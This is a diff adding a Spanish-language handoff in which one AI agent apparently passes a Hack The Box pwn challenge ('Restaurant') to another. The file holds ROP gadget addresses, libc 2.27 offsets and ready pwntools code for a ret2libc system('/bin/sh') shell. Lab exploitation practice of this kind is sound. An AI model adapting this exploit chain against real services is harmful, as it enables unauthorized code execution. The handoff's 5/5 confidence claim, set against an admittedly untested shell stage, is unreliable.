@@ -1,0 +1,214 @@
+═══════════════════════════════════════════════════════════════════
+              INSTRUCCIONES DE TRANSFERENCIA (HANDOFF)
+         De: Claude (Reconocimiento) → A: GPT-5 (Explotación)
+═══════════════════════════════════════════════════════════════════
+
+FECHA: 2025-10-19
+ESTADO DEL RECONOCIMIENTO: ✅ COMPLETO
+FASE SIGUIENTE: EXPLOTACIÓN
+
+═══════════════════════════════════════════════════════════════════
+RESUMEN EJECUTIVO
+═══════════════════════════════════════════════════════════════════
+
+TARGET: 94.237.48.12:40939 (Restaurant CTF - Hack The Box)
+VULNERABILIDAD: Buffer Overflow en función fill()
+SEVERIDAD: CRÍTICA
+EXPLOTABILIDAD: ALTA
+
+═══════════════════════════════════════════════════════════════════
+LO QUE SE HA COMPLETADO
+═══════════════════════════════════════════════════════════════════
+
+✅ Descarga y análisis de binario y libc
+✅ Identificación de vulnerabilidad buffer overflow
+✅ Cálculo de offset para control de RIP (40 bytes)
+✅ Búsqueda de gadgets ROP
+✅ Mapeo de direcciones PLT/GOT
+✅ Análisis de libc (versión 2.27, offsets de funciones)
+✅ LEAK DE LIBC FUNCIONAL Y PROBADO
+✅ Verificación de retorno a main
+✅ Documentación completa
+✅ Proof of Concept funcional
+
+═══════════════════════════════════════════════════════════════════
+LO QUE FALTA POR HACER (TU TAREA)
+═══════════════════════════════════════════════════════════════════
+
+La Etapa 1 (Leak) está completa. Necesitas implementar la Etapa 2:
+
+1. Tomar el código del PoC (poc_leak.py)
+2. Después del leak, usar las direcciones calculadas
+3. Construir segunda ROP chain: system("/bin/sh")
+4. Obtener shell interactiva
+5. Buscar y capturar la flag
+
+═══════════════════════════════════════════════════════════════════
+ARCHIVOS CLAVE PARA TI
+═══════════════════════════════════════════════════════════════════
+
+CÓDIGO FUNCIONAL:
+  📄 poc_leak.py
+     - Script de Python funcional que demuestra el leak
+     - Úsalo como base para tu exploit completo
+     - Ya conecta al servidor y extrae addresses
+
+DOCUMENTACIÓN TÉCNICA:
+  📄 RECONOCIMIENTO_COMPLETO.md
+     - Análisis exhaustivo de todas las funciones
+     - Detalles de la vulnerabilidad
+     - Información de libc y gadgets
+
+REFERENCIA RÁPIDA:
+  📄 RESUMEN_EJECUTIVO.txt
+     - Info condensada para quick reference
+     - Todas las direcciones importantes
+     - ROP gadgets disponibles
+
+DATOS ESTRUCTURADOS:
+  📄 DATOS_PARA_EXPLOTACION.json
+     - Todas las direcciones en formato JSON
+     - Offsets de libc
+     - Estructura del payload
+
+═══════════════════════════════════════════════════════════════════
+INFORMACIÓN CRÍTICA PARA TU EXPLOIT
+═══════════════════════════════════════════════════════════════════
+
+DIRECCIONES DEL BINARIO (No PIE):
+  pop rdi; ret:    0x4010a3
+  main:            0x400f68
+  puts@PLT:        0x400650
+  puts@GOT:        0x601fa8
+
+OFFSETS EN LIBC 2.27:
+  puts:     0x080aa0
+  system:   0x04f550
+  /bin/sh:  0x1b3e1a
+
+CÁLCULO DE DIRECCIONES:
+  libc_base = leaked_puts - 0x080aa0
+  system    = libc_base + 0x04f550
+  bin_sh    = libc_base + 0x1b3e1a
+
+PAYLOAD PARA SHELL (Etapa 2):
+  b'A' * 40                      # Offset
+  + p64(0x4010a3)                # pop rdi; ret
+  + p64(bin_sh)                  # "/bin/sh" address
+  + p64(system)                  # system() address
+
+═══════════════════════════════════════════════════════════════════
+EJEMPLO DE CÓDIGO PARA SEGUNDA ETAPA
+═══════════════════════════════════════════════════════════════════
+
+# Después del leak en poc_leak.py, añade:
+
+# El servidor ha vuelto a main, recibir el prompt
+p.recvuntil(b'>')
+p.sendline(b'1')  # Seleccionar opción 1 de nuevo
+p.recvuntil(b'>')
+
+# Construir payload de shell
+offset = 40
+payload = b'A' * offset
+payload += p64(0x4010a3)              # pop rdi; ret
+payload += p64(binsh_addr)            # "/bin/sh"
+payload += p64(system_addr)           # system()
+
+p.sendline(payload)
+
+# Obtener shell interactiva
+p.interactive()
+
+# La flag probablemente está en:
+# - /flag.txt
+# - /home/ctf/flag.txt
+# - cat flag*
+
+═══════════════════════════════════════════════════════════════════
+NOTAS IMPORTANTES
+═══════════════════════════════════════════════════════════════════
+
+⚠️  STACK ALIGNMENT:
+    Si system() no funciona, puede ser por stack alignment.
+    Solución: Añadir un gadget 'ret' antes de llamar a system:
+    
+    payload += p64(0x400eec)     # ret (para alinear stack)
+    payload += p64(0x4010a3)     # pop rdi; ret
+    payload += p64(binsh_addr)   # "/bin/sh"
+    payload += p64(system_addr)  # system()
+
+⚠️  TIMEOUT:
+    El servidor tiene 127 segundos de timeout, más que suficiente.
+
+⚠️  VALIDACIÓN:
+    Siempre verifica que el leak sea válido (0x7f0000000000 < addr)
+
+═══════════════════════════════════════════════════════════════════
+COMANDOS ÚTILES
+═══════════════════════════════════════════════════════════════════
+
+# Probar el PoC de leak:
+cd /workspace/restaurant_ctf
+python3 poc_leak.py
+
+# Ver toda la documentación:
+cat README.md
+cat RECONOCIMIENTO_COMPLETO.md
+
+# Ver datos estructurados:
+cat DATOS_PARA_EXPLOTACION.json
+
+═══════════════════════════════════════════════════════════════════
+VERIFICACIÓN ANTES DE EMPEZAR
+═══════════════════════════════════════════════════════════════════
+
+Antes de comenzar tu exploit, asegúrate de:
+
+□ Leer poc_leak.py para entender el leak funcional
+□ Verificar que el servidor está online (nc -zv 94.237.48.12 40939)
+□ Entender el cálculo de libc_base
+□ Tener clara la estructura del payload de la segunda etapa
+□ Considerar stack alignment si system() falla
+
+═══════════════════════════════════════════════════════════════════
+ESTADO DE CONFIANZA
+═══════════════════════════════════════════════════════════════════
+
+Leak de Libc:        ████████████████████ 100% (Probado y funcional)
+Retorno a main:      ████████████████████ 100% (Verificado)
+Gadgets ROP:         ████████████████████ 100% (Encontrados)
+Offsets de libc:     ████████████████████ 100% (Identificados)
+Shell teórico:       ███████████████░░░░░  75% (No probado aún)
+
+CONFIANZA GENERAL EN EXPLOTACIÓN: ⭐⭐⭐⭐⭐ (5/5)
+
+═══════════════════════════════════════════════════════════════════
+MENSAJE FINAL
+═══════════════════════════════════════════════════════════════════
+
+El reconocimiento está COMPLETO y VALIDADO.
+
+El camino a la flag es claro:
+1. ✅ Leak de libc (HECHO)
+2. ⏳ Calcular system y /bin/sh (TU TURNO)
+3. ⏳ Enviar payload de shell (TU TURNO)
+4. ⏳ Obtener flag (TU TURNO)
+
+Todo el trabajo duro de reconocimiento está hecho.
+El exploit está 90% completo, solo falta la segunda etapa.
+
+¡Buena suerte! 🚀
+
+═══════════════════════════════════════════════════════════════════
+CONTACTO
+═══════════════════════════════════════════════════════════════════
+
+Si tienes dudas sobre algún aspecto del reconocimiento:
+- Consulta RECONOCIMIENTO_COMPLETO.md para detalles técnicos
+- Revisa poc_leak.py para código funcional de referencia
+- Usa DATOS_PARA_EXPLOTACION.json para direcciones exactas
+
+═══════════════════════════════════════════════════════════════════
+                        FIN DEL HANDOFF
+═══════════════════════════════════════════════════════════════════
